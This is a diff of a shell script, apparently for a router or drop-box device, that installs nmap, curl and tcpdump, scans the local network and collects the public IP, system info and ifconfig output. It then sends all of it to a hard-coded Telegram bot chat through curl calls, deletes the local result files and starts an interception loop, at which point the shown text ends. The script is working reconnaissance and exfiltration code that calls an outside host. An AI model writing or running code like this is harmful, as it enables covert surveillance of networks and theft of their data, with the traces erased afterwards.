@@ -7,12 +7,14 @@ if [ $? -eq 0 ]; then
 	# Installing dependencies
 	echo "Install dependencies"
 	opkg update
+	opkg install bash
 	opkg install nmap
+	opkg install curl
 	opkg install tcpdump
 	echo "Dependencies ok"
 	sleep 1
 	
-	# Create a file on SD to save results
+	# Create a file to save results
 	echo "Start scanning..."
 	nmap_output_file="nmap_scan_$current_date.txt"
 	touch $nmap_output_file
@@ -29,7 +31,7 @@ if [ $? -eq 0 ]; then
 	system_info=$(uname -a)
 
 	# Get ifconfig result
-	ifconfig_output_file="nmap_scan_$current_date.txt"
+	ifconfig_output_file="ifconfig_$current_date.txt"
 	touch $ifconfig_output_file
 	ifconfig > $ifconfig_output_file
 	
@@ -39,12 +41,12 @@ if [ $? -eq 0 ]; then
 	chat_id="1789487661"
 	filepath1=$nmap_output_file
 	filepath3=$ifconfig_output_file
-	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip \n System info: $system_info"
+	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip"
+	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System info: $system_info"
 	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
 	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
 	rm "$filepath1"
 	rm "$filepath3"
-	
 	echo "Start intercepting..."
 	while true
 	do
